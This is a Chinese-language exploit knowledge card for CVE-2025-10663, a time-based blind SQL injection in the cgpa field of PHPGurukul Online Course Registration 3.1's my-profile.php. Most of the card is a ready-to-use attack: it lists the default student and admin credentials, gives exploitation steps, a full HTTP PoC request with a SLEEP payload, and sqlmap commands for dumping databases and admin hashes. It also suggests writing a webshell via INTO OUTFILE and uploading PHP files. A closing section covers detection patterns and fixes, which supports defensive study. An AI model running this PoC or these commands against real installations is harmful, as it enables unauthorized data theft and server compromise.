---
id: web-generic-sqli-phpgurukul-myprofile-cgpa-time-blind
title: PHPGurukul 在线课程注册系统 my-profile.php cgpa 参数时间盲注（CVE-2025-10663）
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-update-statement-time-blind
aliases:
- CVE-2025-10663
- PHPGurukul Online Course Registration SQL 注入
- my-profile.php cgpa SQLi
- 学生资料更新 时间盲注
- UPDATE students cgpa 注入
tags:
- sql-injection
- mysql
- time-blind
- php
- php-gurukul
- authenticated
- cve-2025-10663
cve:
- CVE-2025-10663
severity: medium
confidence: high
status: verified
affected_versions: PHPGurukul Online Course Registration 3.1
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:01:26+08:00'
  notes: 已对照原文与13张图核对：my-profile.php 的 UPDATE 语句直接拼接 studentname/photo/cgpa、cgpa payload ' AND (SELECT 1811 FROM (SELECT(SLEEP(10)))SwdW) AND 'SelT'='SelT 触发延迟、sqlmap 取 information_schema/onlinecourse，均与图07-13一致；CVE-2025-10663、受影响版本 3.1、NVD CNA 6.9 Medium 与图01一致。已修正卡内'原文 5.7/8.0 均验证'为'原文环境 8.0.11，sqlmap 识别 >=5.0.12'。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

PHPGurukul Online Course Registration 3.1 的 `my-profile.php` 在处理学生资料更新时，把 `$_POST['studentname']`、`$_FILES['photo']['name']`、`$_POST['cgpa']` 直接拼进 `UPDATE students ... where StudentRegno='..."`，未使用预处理或转义；登录后的学生把 `cgpa` 改成 `' AND (SELECT 1811 FROM (SELECT(SLEEP(10)))SwdW) AND 'SelT'='SelT` 即可触发时间盲注，sqlmap 可进一步枚举数据库（CVE-2025-10663，NVD CNA 评分 6.9）。

## 原理

- 漏洞代码：`$ret=mysqli_query($con,"update students set studentName='$studentname',studentPhoto='$photo',cgpa='$cgpa' where StudentRegno='".$_SESSION['login']."'");`，四个值全部来自用户会话/表单，没有任何 `mysqli_real_escape_string` 或预处理。
- `cgpa` 被包在单引号内，攻击者先闭合引号，再追加 `AND (SELECT ... SLEEP(10) ...)` 并补上 `'SelT'='SelT` 保持语法完整；由于 UPDATE 的 WHERE 恒真，语句执行时会在数据库侧睡眠，HTTP 响应时间随之延迟，形成布尔/时间盲注 oracle。
- 参数化缺失使 UNION、报错、堆叠（视 `mysqli_query` 与权限）等变体同样可行；原文用 `SELECT 1811 FROM (SELECT(SLEEP(10)))SwdW` 的派生表写法规避部分过滤/语法限制。
- 认证门槛低：系统源码自带默认学生账号（原文 Reg No `10806121` / `Test@123`）与默认管理员（`admin`/`Test@123`），攻击者登录学生账号即可到达该注入点；SQL 执行使用应用数据库账号，可读取 `onlinecourse` 库中的学生、课程、管理员等数据。

## 触发条件

- 目标为 PHPGurukul Online Course Registration 3.1；
- 攻击者拥有任意有效学生账号（默认口令或注册功能）；
- `my-profile.php` 可访问且 `submit` 表单可提交；
- 数据库为 MySQL（原文环境 8.0.11，sqlmap 识别为 MySQL >= 5.0.12），`SLEEP()` 可用。

## 利用步骤

1. 用默认/已注册学生账号登录 `/onlinecourse/index.php`。
2. 进入 `/onlinecourse/my-profile.php`，填写姓名、CGPA 并提交更新。
3. 用 Burp 拦截请求，将 `cgpa` 替换为时间盲注 payload，观察响应延迟（原文 SLEEP(10) 成功）。
4. 用 sqlmap 读取请求文件枚举数据库：`python sqlmap.py -r post.txt --batch --dbs`，原文获得 `information_schema`、`onlinecourse` 两个库。
5. 继续 `--tables`/`--dump` 获取管理员哈希、学生信息等敏感数据。

## PoC

```http
POST /onlinecourse/my-profile.php HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<student-session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="studentname"

zhangsan
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="studentregno"

10806121
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Pincode"

822894
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="cgpa"

7.10' AND (SELECT 1811 FROM (SELECT(SLEEP(10)))SwdW) AND 'SelT'='SelT
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="photo"; filename="001.jpg"
Content-Type: image/jpeg

<JPEG bytes>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```bash
python sqlmap.py -r post.txt --batch --dbs
# 原文结果：information_schema、onlinecourse
```

## 变体与关联

- 同 sink 的其他参数：`studentname`、`studentPhoto`（上传文件名）同样未转义，可分别注入；`studentregno`/`Pincode` 字段在页面只读但仍随表单提交，需看服务端是否使用。
- 注入类型变体：时间盲注、布尔盲注、报错注入、UNION（视列数与回显）；MySQL 高权限时可尝试 `INTO OUTFILE` 写 Webshell（参见 [[web-generic-sqli-mysql-outfile-general-log-webshell]]）。
- 相邻风险：同一文件用 `move_uploaded_file($_FILES["photo"]["tmp_name"], "studentphoto/".$_FILES["photo"]["name"])` 按原始文件名保存照片，未校验后缀；若 `studentphoto/` 在 Web 根且 PHP 可解析，登录学生可进一步上传 PHP 文件（原文未利用，本卡不将其视为已验证链）。
- 通用模式：UPDATE 语句中的引号闭合 + 恒真尾部，是“更新类接口”最常见的注入形态；可对照 [[web-generic-sqli-error-based-extraction]]、[[web-generic-sqli-dnslog-oob-exfiltration]]。

## 检测与防御

- 检测：`my-profile.php` 等更新接口的 `cgpa`、`studentname`、`photo` 出现单引号、`SLEEP(`、`AND (SELECT`、`FROM (SELECT` 等特征；数据库慢查询/审计日志出现带 `SLEEP` 的 UPDATE；同一会话短时间内多次资料更新且响应时间规律性延迟。
- 修复：改用 `mysqli`/PDO 预处理并绑定参数（原文修复代码已示范 `prepare`+`bind_param`）；对 `cgpa` 做数值范围校验，对姓名/文件名做白名单/重命名。
- 加固：删除默认账号或强制首次登录改密；数据库账号最小权限（禁止 FILE、堆叠语句）；WAF 拦截 `SLEEP(`、`BENCHMARK(` 等时间注入特征；上线前用 SAST 扫描 `mysqli_query` 拼接点。
